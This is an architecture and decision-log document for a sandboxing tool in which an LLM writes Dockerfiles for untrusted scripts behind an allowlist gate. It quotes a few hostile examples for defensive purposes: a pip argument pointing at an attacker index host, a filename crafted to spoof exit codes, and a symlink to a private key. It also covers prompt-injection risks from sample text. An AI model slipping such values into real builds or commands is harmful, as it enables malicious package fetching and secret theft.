# Architecture

Invariants and decisions, not a mirror of the code. If a sentence here restates what a
file does, it belongs in the file instead.

## The pipeline

    script.py
       |
       v
    LLM writes a Dockerfile  (forced strict tool call, one string field)
       |
       v
    gate: allowlist of six instructions, no continuations   --reject--> repair
       |                                                                  ^
       v                                                                  |
    build  (network ON, apt and pip need it)  ------------- fails --------+
       |                                                                  |
       v                                                                  |
    run  (network OFF, all caps dropped, non-root, read-only) -- fails ---+
       |                                                          bounded evidence
       v
    verdict  (computed from observed behaviour; LLM opinion advisory)   NOT BUILT

The repair loop is the single back-edge, capped. Every repaired Dockerfile re-enters the
same gate before any build.

## Invariants

1. The gate runs before every build, first generation and every repair alike, and the
   fallback Dockerfile we write ourselves passes through it too. One path to the daemon,
   whoever wrote the file.
2. The gate is an allowlist of permitted instructions, never a blocklist. This applies to
   characters as well as instructions: a Dockerfile may contain printable characters,
   newlines and tabs, and nothing else.
3. No Dockerfile may contain a line continuation; every physical line is blank, a
   comment, or begins with an allowlisted instruction. The gate splits on `\n` and
   nothing else, so its notion of a line is Docker's by construction.
4. Build has network. Run has none.
5. The run has a memory cap, a pids cap, a cpu cap, read-only root with a tmpfs,
   cap-drop ALL, no-new-privileges, and a non-root user.
6. Every container is named before it spawns and killed in a `finally`, so killing the
   docker client can never leave one running. Removal is deliberately later: the
   container is the only durable proof that an untrusted sample already ran, so it is
   removed once the run's result has been checkpointed, and a sweep collects whatever a
   crashed run left behind.
7. No Docker socket is mounted anywhere, and the agent is never containerised.
8. Test arguments are passed only after the image name, so an ENTRYPOINT image receives
   them as argv and never as docker flags.
9. All container output is attacker-controlled text, and evidence is bounded before it
   reaches a prompt.
10. The verdict is computed from observed behaviour. The model's opinion is labelled
    advisory and can never flip it.
11. The written `FROM` equals the `base_image` the model declared separately, and names no
    registry host. The declaration is checkable without parsing the file it describes.
12. Every `COPY` destination resolves under `/app`, normalised before comparison rather
    than prefix-matched as a string.
13. `RUN` is exec form, so its arguments are a list checked one at a time rather than a
    string matched against a prefix.
14. A refusal by the model never spends a repair attempt; it has its own counter and then
    a fallback we wrote.
15. A language not in the table is refused before the model is consulted at all.
16. Only the workspace handles a path. Everything downstream receives names and contents.
17. No file in a build context may be named something the build itself interprets. A
    context file called `Dockerfile` replaces the gated one, and the container then runs
    instructions nothing checked.
18. Every reply from the model is charged to the run's ledger, whether it was usable or
    not. A refusal, a truncation and a schema failure all cost tokens, and a bound that
    charged only for successes could be walked past by a loop that never succeeds.
19. Every event an engine yields is one of a closed set, and every string it carries has
    its authors declared. An engine cannot invent a kind, and no record reaches a reader
    without saying whether we wrote it. A test reads both engine modules and fails if the
    union of what they emit is not exactly the table.
20. A run that cannot reach the model ends with `ok` false and never falls back to a
    Dockerfile we wrote. It is not a finding about the script, and a verdict no judgment
    went into must not be reported as a success.
21. Configuration is never read from a directory the sample controls. The `.env` is read
    from the package's own directory only, and only an allowlist of variable names is
    accepted from it, so a file shipped beside a sample can neither supply credentials
    nor redirect where the model call goes. The allowlist is three names today: it said
    four here until the token budget was deleted and took the fourth with it.
22. What the shell learns comes from a typed `Outcome.kind`, never from matching words in
    a sentence. `reason` splices in filenames and provider text, so a sample could
    otherwise choose the exit code.
23. The model chooses what it reads and never what the loop does. The tools it may call
    are read-only inspections of the script. Submitting a Dockerfile is a tool the graph
    routes on rather than executes, so the gate, the build and the run are deterministic
    nodes that no tool call can reach.
24. One prompt holds at most the bounded script, plus `MAX_LOOKS` slices of it, plus the
    previous Dockerfile and the evidence, each bounded. The conversation is cleared at
    the start of every attempt, which is a security property and not housekeeping: the
    message list accumulates, so without the reset three attempts of four looks would put
    twelve slices of the sample in one context.

    The manifests are bounded separately, at `MANIFEST_LIMIT` each, and are a different
    file rather than the script. They are untrusted by the same argument and are not
    covered by the arithmetic above, which is about reassembling the sample. This
    sentence was on `main`, was dropped when the invariants were deduped, and a review
    caught it: a separate bound on untrusted text entering a prompt went from stated to
    unstated while the code kept enforcing it, which is the quieter half of the rule
    about retiring claims.
25. Every tool result is bounded and labelled where it is produced, not where it is
    consumed. There is one function that cuts a piece out of the sample, which is the
    only place the rule cannot be forgotten by a later caller.
26. A search pattern is a literal, never a regular expression. The pattern is chosen by a
    model that has just read attacker-controlled text, and `re` on a model-chosen pattern
    is catastrophic backtracking on the host, which is the one machine here not in a
    sandbox.
27. Every reply is exactly one tool call. Parallel tool use is disabled, because a second
    call in one reply never receives a result and would let one reply return several
    slices past the look cap.
28. A gate rejection is repair evidence, so its size is a security property and not a
    formatting one. The gate refuses a Dockerfile over `MAX_DOCKERFILE`, and a rejection
    quotes at most `QUOTED_LINE` characters of the offending line. Both are the same rule
    as 25, one module over: the reason is created in the gate, so the gate is where it is
    bounded, rather than at each place a reason is later used.

    This was invariant 24's second break, found after the first was fixed. Every
    rejection names the line so the model can repair it, and that line is written by a
    model that has just read the sample. One `WORKDIR` instruction carrying 200,000
    characters put 202,705 of them into a single repair prompt. The agent bounds the
    reason again on the way into the prompt, which the source cap makes unreachable
    through the shipped gate and is kept anyway: `Gate` is a Protocol, and a guarantee
    about what enters a prompt must not depend on which implementation is wired in.

    The two numbers answer different questions and are deliberately not equal. The gate
    asks whether this could be a Dockerfile at all, at 8KB. `DOCKERFILE_LIMIT` asks how
    much of one may be replayed into a prompt, at 2KB. A file between them passes the
    gate and comes back for repair with a marker in the middle, which is the correct
    behaviour for a file that large: `bound` keeps the head and the tail, so `FROM` and
    the command survive, and the marker says what was removed.

29. Nothing that cannot be serialised goes in graph state. The model, the sandbox, the
    gate and the event sink are runtime context. State is what a checkpointer writes
    down, so a credential in state is a credential written to wherever checkpoints go.
30. Every image and container this project creates carries an `envforge.run` label naming
    the run that made it, and a second label saying when that run started. The run that
    made them removes them when it finishes, in a `finally`. A sweep at startup removes
    labelled **images** from other runs older than an hour, and both guards matter: the
    ownership check stops a run deleting the image it is about to execute, and the age
    check stops it deleting the work of a second envforge running right now, which labels
    its objects identically and cannot be asked whether it is alive.

    Containers are never swept, and that is invariant 32 winning an argument with this
    one. A crashed attempt's container is the only proof that its sample already ran, so
    collecting it would let a run resumed later execute that sample again and report an
    ordinary verdict. An exited container costs kilobytes; images are what fill a disk
    and were never evidence. The cost is that a machine running many crashed runs
    accumulates exited containers, which `docker container prune` clears.
31. The BuildKit cache is never pruned automatically. Layer reuse is what makes a repair
    attempt cheap, and a loop that deleted its own base layers would pay full price on
    every attempt. It is unbounded by design, and `docker builder prune` is the user's to
    run. `remove_image` removes a tag, and with it the image and any layers nothing else
    references; it does not touch that cache, and reading it as "cleanup" is what would
    let someone conclude a finished run leaves nothing behind on the machine.
32. An untrusted sample is executed at most once per attempt, and the guarantee is
    durable rather than best effort. The container is named from the run and the attempt,
    it is killed but not removed when the run node finishes, and it is removed only after
    the result has been checkpointed. A container bearing an attempt's name is therefore
    proof that the attempt already executed, and a resumed run that finds one refuses to
    execute again and reports the attempt as interrupted rather than producing a verdict.
    This holds with a durable checkpointer; `InMemorySaver` loses the state with the
    process, so there is no resume to protect.

    It held for only an hour until a review measured it. The sweep collected another
    run's containers, so a run resumed later found no evidence, executed the sample again
    and reported an ordinary verdict, which is the worst output this tool has: not an
    error, a confident wrong answer. The sweep no longer touches containers at all. That
    is this invariant winning against 30 on purpose, and the reasoning is written in both
    so neither can be read alone and believed.

Invariants 4 and 5 are asserted against the argv that `sandbox.py` actually builds, so
dropping a flag from the code fails a test rather than passing review.

Invariants 2, 3, 12 and 17 each exist because an earlier version was bypassed, or in 17's
case because the absence of the rule was. The
history is in STATUS.md and it is the same lesson three times: a rule that checks the text
instead of the thing the text means is not a rule.

## Decision log

### ADR-006: LLM provider layer is a hand-rolled Protocol, not a framework
Decided 2026-08-22. `envforge/llm.py`: an `LLM` Protocol, `AnthropicLLM` (native SDK,
strict tool use, GA 2026-01), `OpenAICompatLLM` (openai SDK plus `base_url`, covering
OpenAI and Groq), `make_llm("provider:model")`. Rejected: one OpenAI client for all
three, because Anthropic's compatibility layer ignores `strict`, so the only
grammar-guaranteed structured output for Claude is native-API-only, and Anthropic labels
that layer non-production. Rejected: LiteLLM and LangChain's model classes, because a
650-line project with one call site cannot justify a dependency it cannot explain, and
the trace module needs the unwrapped wire JSON. Provider wire differences live in two
classes of about thirty lines each; argument validation is uniform above them.

### ADR-007: Dockerfile generation shape
Decided 2026-08-22. Forced strict tool call, two fields, `dockerfile` and
`base_image`, with `additionalProperties` false. The same call serves
generation and repair; repair is a full rewrite, never a diff. The gate bans line
continuations, so every physical line starts with an allowlisted instruction. Rejected:
raw text with fence stripping, because the extraction heuristic becomes a second parser
standing in front of the gate. Rejected: structured fields plus a renderer, because the
schema either stays too rigid for real scripts or grows into a shadow Dockerfile AST,
and the gate would then validate our own template rather than the untrusted artifact.
Note: the grammar guarantee holds on Anthropic and OpenAI; Groq is a forced call plus
validation.

### ADR-008: who owns an ambiguous exit code
Decided 2026-08-22, revised 2026-08-23 after an experiment. Exit 125 is returned when the
docker CLI rejects our command, and a script may exit 125 to imitate that. `--cidfile`
settles it, because docker writes that file only once the container exists: absent means
our bug and raises, present means the script's behaviour and is returned as data.

126 and 127 have the same imitation problem and were first handled by an attempt cap
alone. A probe found the witness: `State.Error` on the container carries the runc message
when the process never started, and is empty when a script chose the code. The loop now
asks whether the container started rather than what number it produced, so there is no
code list to maintain. Rejected: trusting the exit code, because a faked 126 pulls the
loop into a repair that cannot help and the run already produced its evidence.

### ADR-009: the gate is an allowlist of instructions, and RUN is exec form
Decided 2026-08-23, RUN revised 2026-08-24. Six instructions and nothing else. RUN began
as a shell string with a banned-metacharacter list, which was a proxy for "no shell will
interpret this" and had collateral: `>` and `<` are redirection operators and version
specifiers at once, so `pip install "flask>=2.0"` was refused. Exec form removes the shell,
making the proxy unnecessary rather than relaxed, and turns the command into a list whose
arguments are checked individually. That closed a second hole in the same change: as a
string prefix, `pip install` also matched `pip install --index-url https://evil/ foo`.

What the gate does not do is part of the decision. `pip install <name>` runs that package's
setup code at build time with network, and no instruction allowlist can prevent that
because installing packages is the product. Containment is the container. The mitigations
are offline installs after pre-resolution, and an egress allowlist, and neither lives here.

### ADR-010: a refusal is not a repair
Decided 2026-08-23. The model may decline to write a Dockerfile for a script that looks
hostile. That is not repairable by rewriting, so it gets its own counter: one retry, then a
fallback Dockerfile we write ourselves, which passes the same gate. The reason for the
refusal is kept as a structure and reported beside observed behaviour, labelled advisory.
It never gates, because the script under test is inside the prompt and therefore writes
part of the text the model judged. Rejected: retrying until the model complies, which reads
as a loop that asks until the classifier gives up.

### ADR-011: the language label comes from the file extension
Decided 2026-08-25. One `LANGUAGES` table holds extensions, base image, command and the
sibling filenames worth gathering, so adding a language is one entry rather than several
that can disagree. The gate does not import it and has no business knowing what language
anything is. Rejected: asking the model, not because it is a security boundary (it is not;
the door check bounds the answer either way) but because it would send attacker text to a
model before the door check on every run, and would let a script steer its own label with a
comment.

### ADR-012: only the workspace handles a path
Decided 2026-08-25. Tools and the sandbox receive names and contents. Everything that can
go wrong with a filesystem happens once, at ingestion. Symlinks are resolved and then
checked for containment, in that order, because a prefix test on the joined path passes a
`requirements.txt` symlinked to a private key. The script and its siblings are treated
differently: a symlinked script is followed, since the user named it, and the root becomes
wherever it actually lives; siblings were discovered rather than named and may not leave
that root. `Sandbox.build` takes those contents rather than a path, so the script is read
exactly once and the bytes the model reviewed are the bytes the container runs.

### ADR-013: the outcome carries totals, the event stream carries the bodies
Decided 2026-08-25, revised 2026-08-27. `Outcome` held every `Call`, and a `Call` holds the
full request and response JSON. Harmless at four small calls and megabytes once a tool loop
runs fifteen turns, on the one event every consumer must hold. It now carries a `Usage` of
counts and token totals plus a full UUID `run_id`; the whole `Call` rides the `wrote` event,
which carries the same `run_id`. `Usage.calls` counts every request sent to the model, and
since invariant 18 its token totals count every reply that reported a usage, a refusal and a
truncation included, rather than successes alone. Rejected: dropping the bodies until
the trace module exists, which would lose the wire JSON the trace is being built to record.

Raw provider bodies for refusals, truncations and invalid replies are not yet preserved.
They need error types that retain provider wire data, so the trace module owns
that design rather than adding half a trace to the repair loop.

### ADR-014: the engine seam is a labelled vocabulary, not a topology
Decided 2026-08-27. `envforge/events.py` holds the fifteen kinds an engine may yield, and
`Event` refuses anything else at construction. The plain loop and the LangGraph port both
honour it, which a node-shaped interface could not be: a plain loop has no nodes.

Each kind declares the authors of its message and of every data key, as a set rather than
one value, because most of these strings have more than one: `gate_rejected` is our
sentence quoting the model's line. Choosing a single label would mean ranking a model
against a container and there is no honest ranking there, while the question a renderer
asks is answered by `authors() == {US}` or not.

The labels are declared per kind and are the union over every path emitting it, so
`finished` carries `INPUT` because one of its seven emission sites names the language the caller
asked for. Rejected: a label chosen at each emission, which is more precise and is not a
contract, since nothing can check that an emitter filled it in honestly.

Nothing reads the labels yet; the trace module will. They are written now because only
the code emitting an event knows who wrote the strings in it, so this is the one property
that cannot be added afterwards.

### ADR-015: the token budget, and why it was deleted
Decided 2026-08-27, reversed 2026-09-01. `envforge/budget.py` bounded model spend in tokens
with a reserve held back for the call that has to produce a Dockerfile. The whole module is
gone and this entry is kept as the record of a mistake rather than of a design.

It could not fire. Seven calls was the worst a run could make, `max_attempts` capped it
there, and seven worst-case calls estimate to 150,000 tokens against a 256,000 ceiling.
Measured before deleting it, not assumed. A second lock on a door the first lock already
held.

**That premise is gone, one change later, and the deletion is not being reversed on it
yet.** The looking tools make the worst case sixteen calls rather than seven, and a run
driven to it clears the same 256,000 ceiling: 320,000 tokens on one set of per-call input
assumptions and 348,000 on another. The call count is the robust half and the token total
is a modelling choice, so the claim to rely on is sixteen calls and that no plausible
assumption keeps them under the ceiling. Sixteen and not the
fifteen that `max_attempts * (MAX_LOOKS + 1)` suggests: a refusal does not spend an
attempt, so it is a free extra call, which is a reminder that the arithmetic here should
be driven rather than derived. It was derived first and was wrong by one. The argument above was sound and its arithmetic is no
longer true, which is recorded here because an ADR whose reasoning has silently expired is
worse than no ADR.

Not reversed, because the reason the budget was deleted was that it was a bound nothing
had ever hit, and a bound nothing has hit is still what a reinstated one would be: the
number that actually stops a runaway run is `max_attempts`, which now caps looks as well
as builds. What has changed is that "it cannot fire" is no longer the argument. If a
ceiling comes back it should come back on evidence of a run that cost more than it should
have, and this paragraph is the note to whoever reads that evidence first.

`can_investigate`, the half that held the reserve back, was never called by anything. It
was built for a tool loop that did not exist, on the argument that a loop written against a
turn counter would be a rewrite later. That argument is how speculative code gets written:
it is always cheaper to add the thing now, and the cost only shows up as the surface it
drags behind it. This one cost an exit code, an `Outcome` kind, an event kind, a terminal
path in the loop, a CLI flag, an environment variable and a share of seven review rounds,
for 16 lines of logic wrapped in 65 lines of prose defending them.

What replaces it is what was already there. `max_attempts` bounds container work and bounds
model calls as a side effect. `Usage` stays, in `agent.py`, because reporting what a run
cost is a feature and counting is not the same as enforcing. Account-level spend limits
belong in the provider's console, which is where every other project puts them.

The lesson worth keeping is the order. The right time to build a bound is when something
has run away, or when a measurement shows it could. Not when a future feature might want
one.

### ADR-016: keys come from a .env, and a test guards the example
Decided 2026-08-30, reversing the 2026-08-22 decision that the key is read from the
environment and never from a file. `.env.example` ships here with placeholders, a developer
copies it to `.env`, and the command line entry point loads it with a standard loader.

The reversal is about cost, not about safety. Reading only from the environment is
marginally safer, because a secret in a process environment is not a secret on disk. It is
the wrong trade for a project whose largest problem is that nobody can run it: a `.env` with
a checked-in example is what someone cloning this expects, and every step between cloning
and a first run is a step where they stop. Rejected: the OS keychain, which is safer again
and asks a new reader to learn a platform-specific command before anything works.

Amended 2026-08-30 after a review: the file is read from the directory holding the package
and never from the working directory, and only `ANTHROPIC_API_KEY`, `OPENAI_API_KEY`,
`GROQ_API_KEY` and `ENVFORGE_TOKEN_BUDGET` are accepted from it. The first version read
`./.env`, and since this tool is normally run from the directory holding the sample under
analysis, that let a sample ship configuration the process obeyed. See invariant 21.

What holds the line is that `.env` is in `.gitignore` and `.env.example` carries
placeholders only, and both are asserted by a test rather than remembered. The failure this
guards is not the file existing; it is the day a real key is pasted into the example and
committed to a public repository, which no convention prevents and a test does.

### ADR-017: the command line, and the two failures it forced
Decided 2026-08-30. `envforge/__main__.py`. `python -m envforge script.py` runs one script
end to end and `--check` verifies the key without spending a call. It is the first caller
this project has had: everything under it was driven by tests until now.

A failure was fixed because a command line cannot ship with it. A run has to be able to say
honestly that it failed.

The other half of this entry described a spent token budget ending the run rather than
falling back. The budget was deleted on 2026-09-01, see ADR-015, so that half is gone. The
argument it rested on is still the right one and now applies only to an unreachable
provider: a refusal is the model judging the script and a fair reason to fall back, while
our own failure to work is not, and building on it prints a verdict no judgment went into.

A provider failure was not caught at all. `AuthenticationError`, `PermissionDeniedError`
and `RateLimitError` are none of the three `LLMError` types the loop handles, so each one
escaped the generator: no outcome, and whatever had been spent unrecorded. `llm.reachable`
now turns them into one `ProviderUnavailable`, deliberately not an `LLMError` so it cannot
reach the repair path. Matched on HTTP status rather than exception class, because the two
SDKs share no hierarchy; 403 is read further, since an exhausted account and a key without
model access are the same status and only the provider's error type separates them.

The exit code carries the distinction to the shell. `1` is the script running and exiting
nonzero, which is a result. `3` through `7` are this tool being unable to work: no provider
or no credentials, no Docker, no Dockerfile that builds, and the provider refusing the
request we sent. A caller that collapsed them would treat a dead key as a
verdict about the code it was given.

`7` is ours rather than theirs, and it is the same event ADR-008 settled one layer down: a
4xx is the API rejecting our request exactly as docker exit 125 is the CLI rejecting our
command. A malformed request to the provider and a malformed docker command share it. The
statuses a provider gives its own meaning to are read out first, so 401, 403, 404, 408, 429
and 402 keep theirs; everything else in the 4xx range falls here, because enumerating
statuses always misses the next one.
`build_timeout` deliberately shares `6` with the other ways a run ends without a working
image, because a caller's action is the same in all of them, which is to look at the build
rather than to retry. It is only reached after a second timeout: the first buys one rebuild
of the identical Dockerfile, which costs wall clock and no tokens, because buildkit keeps
the layers a cancelled pull managed to fetch and the retry starts warm. Asking the model
again instead would be asking the wrong question at full price, since it cannot see a
clock.

The code is chosen from a typed `Outcome.kind` and never from the words in `reason`. A
first version matched substrings, and `reason` splices in the gate's quoted line, which
carries the script's filename: a sample named "x could not be reached.py" produced the exit
code meaning "retry, the provider was down". `Kind` has no default, because the version
that had one reported a failed run as a success on the single path that forgot to set it.

Configuration is the environment first, then the project's own `.env`, which carries
credentials and nothing else.

The `.env` is read from the directory holding the package and never from the working
directory, and only an allowlist of variable names is accepted from it, three of them
today. Both rules exist because this tool is normally run from the directory holding the
sample it is analysing, so reading `./.env` let an untrusted sample supply configuration
this process then obeyed.

### ADR-018: the model may read the script, and nothing else

Decided 2026-09-01. Two tools, `search_script` and `read_script`, and a conversation in
the model layer to carry their results back.

The problem is arithmetic. `SCRIPT_LIMIT` is 8,192 characters, and the bound is not
negotiable: the script is attacker-controlled text on its way into a prompt, and it is
resent on every repair. Most source files in this repository are longer than that, and so
is `examples/deep_dependency.py`, the fixture this was built against: 16,980 characters, of
which 8,788 are replaced by a marker before a model sees any of it. On a real script the
Dockerfile is written from roughly the first and last quarter of a file.

The fixture rather than a module, deliberately. Two earlier drafts of this paragraph
counted a module and both went stale within the same change that wrote them, because
editing the file moves the number. The fixture exists to be measured and nothing edits it.

A dependency hides anywhere in the discarded middle. An import inside a function, a
subprocess call to a command line tool, and neither appears at the top. Which region
matters differs per script, so no deterministic rule finds it, and that is what makes this
a decision only the model can make. It is the test this project applies before building a
tool at all: "just put it in the prompt" has no answer here, because the bound is the
answer to that.

The same test is why the dependency manifest is **not** a tool. `requirements.txt` was
gathered from the first day and went into every build context, and the prompt never
mentioned it: a file we read, shipped to the daemon, and then asked the model to guess the
contents of. There is no decision in it. It is short, we have it, and it is relevant to
every script it was found beside, so it goes in the prompt. Wrapping it in a tool would
let the model choose not to read a file we are certain it needs, and would have been
agency as theatre.

The caps are the security half. Four looks per attempt, 2,048 characters each, and the
first of those is easy to misread as thrift. A model that asks for eight regions of a
truncated file has reassembled the whole thing one slice at a time, and the bound on how
much of the sample reaches a prompt is gone without a single rule having been broken. The
cap is enforced by withdrawing the tools from the request rather than by asking the model
to stop, because a rule written in a prompt is a request made of the thing the prompt is
defending against.

Three smaller decisions, each with a reason that is not taste.

Two tools rather than one, because a strict schema requires every property in `required`,
so a single tool covering both modes would either force the model to supply a character
range while searching or need an optional field typed as a union, which our validator
skips silently. The grammar constraint is worth more than the tidier menu.

The search pattern is a literal and never a regular expression. It is chosen by a model
that has just read attacker-controlled text, and `re` on such a pattern is catastrophic
backtracking on the host doing the analysis, which is the one machine in this design that
is not in a sandbox.

The assistant turn is kept exactly as the provider returned it rather than rebuilt from
the parsed arguments, because a reconstruction can only carry the parts of a reply this
code models, and whatever it drops surfaces as a 400 on the following request rather than
on the one that lost it. Extended thinking is the concrete case and is a contingency
rather than today's behaviour: no `thinking` parameter is sent, and forced tool choice is
documented as incompatible with it. The first version of this paragraph claimed thinking
was on by default and that the round trip depended on it, which was unverified and is now
not claimed.

The three prompt templates were collapsed onto one shared context in the same change. The
truncation notice and the manifest have to appear on a repair as well as on a first ask,
and three copies of a paragraph is the shape where the third copy goes missing. That shape
is what kept the manifest out of the prompt for months.

### ADR-019: the agent is a LangGraph graph, and there is only one of it
Decided 2026-09-02, replacing an earlier attempt that is kept unmerged as reference.

`envforge/graph.py` is the engine, and everything new is built on it. `StateGraph` over
an extended `MessagesState`, a chat model with `bind_tools`, `@tool` functions inside a
`ToolNode`, and conditional edges.

The decision is that there will be one engine, and the tree does not match it yet: the
`while` loop is still in `envforge/agent.py` and is still what `python -m envforge`
drives, because the command line has not been ported. Writing "there is no second engine"
while one sits in the next file is the kind of sentence this project has a rule against,
so it says this instead. The loop goes when the command line moves, and nothing new is
added to it in the meantime.

That is the reversal worth recording. The first port kept the existing `while` loop and
added a graph beside it, with a contract test proving the two agreed. It passed every
test and bought nothing: two engines mean upkeep, and the second can never be allowed to
behave differently from the first without failing the contract, so it can never become
the thing LangGraph is for. What LangGraph is for is checkpointing, resuming and
inspecting a run between nodes, and none of that arrives while a loop is still the thing
actually running.

The state is plain data and travels between nodes. Nodes return only the fields they
changed and the framework merges them. The first attempt carried one mutable object
through the graph and mutated it inside the nodes, which looks identical from outside and
is a loop wearing a graph costume: nothing is checkpointable, nothing is resumable, and a
node's effect on a run cannot be read from what it returns.

The division of labour is the security story. The model's tools read the script and
nothing else. Submitting a Dockerfile is a tool the graph routes on rather than executes,
so the gate, the build and the run are nodes the model cannot call. `ToolNode` therefore
holds only read-only tools, which is a cleaner statement of the boundary than a comment
would be.

Rejected: `tools_condition`. It answers "tools" or "end", and there are two kinds of tool
call here that must go to different places, so the routing reads the tool name itself.

Rejected: keeping the loop as a fallback engine. See above; it is the whole point.

### ADR-020: what a run leaves on the machine
Decided 2026-09-02, after being asked a question nobody had asked.

Cleanup belongs to the object that owns the run, in a `finally`, and not to the command
line. It lived in the command line because that was the only caller, and the consequence
was invisible until the engine changed: every run driven by anything else leaked an image
per attempt, which was every run of the graph implementation until this was written.

Objects are labelled rather than name-matched. A sweep has to say "this is ours" on
somebody else's machine, and a prefix match on `envforge-` would also match a container a
user named that themselves. Deleting it would be our bug in their workspace.

The start time is a label rather than the object's own creation timestamp, so the sweep
never parses a date. Docker prints creation times in a human format that varies with
locale and version, and an age rule built on parsing that is a rule that breaks somewhere
else.

The limitation is stated rather than fixed: the BuildKit cache grows without bound and
nothing here prunes it. That is deliberate, because pruning it is what would make every
repair attempt pay full price, and it means a finished run does not leave the machine as
it found it. Invariant 31 says so, because the honest failure of a cleanup policy is
someone reading "cleanup" and believing more than it does.

## What crosses each boundary

| from | to | payload |
|---|---|---|
| CLI | agent | a `Workspace` of names and contents, a language, and script arguments |
| agent | LLM | script text, language, bounded failure evidence, and the transcript of tool calls already answered |
| LLM | agent | one tool call: a Dockerfile, or a request to look at part of the script |
| agent | tools | the whole script, which is the only place it is held unbounded |
| tools | agent | at most `SLICE_LIMIT` characters of the sample, labelled as the sample's words |
| LLM | gate | Dockerfile text, declared base image |
| gate | sandbox | approved Dockerfile, or a rejection reason |
| sandbox | agent | exit code, bounded stdout and stderr, timing |
| agent | verdict | what was attempted, what the cage stopped  *(no verdict exists yet)* |
| workspace | agent | filenames and contents, never a path |
